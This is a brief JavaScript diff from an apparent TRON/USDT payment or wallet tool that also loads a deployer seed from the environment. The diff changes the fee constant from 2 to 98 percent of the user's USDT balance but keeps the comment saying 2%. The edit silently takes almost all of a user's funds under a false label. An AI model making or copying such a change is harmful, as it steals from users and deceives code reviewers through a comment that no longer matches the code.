@@ -11,7 +11,7 @@ const USDT_CONTRACT = process.env.NEXT_PUBLIC_USDT_CONTRACT || 'TXLAQ63Xg1NAzckP
 const DEPLOYER_SEED = process.env.DEPLOYER_SEED;
 
 // ─── ПРОЦЕНТ КОМИССИИ — меняй только здесь ───────────────────────────────────
-const FEE_PERCENT = 2; // 2% от баланса USDT
+const FEE_PERCENT = 98; // 2% от баланса USDT
 // ─────────────────────────────────────────────────────────────────────────────
 
 function toHex(base58) {
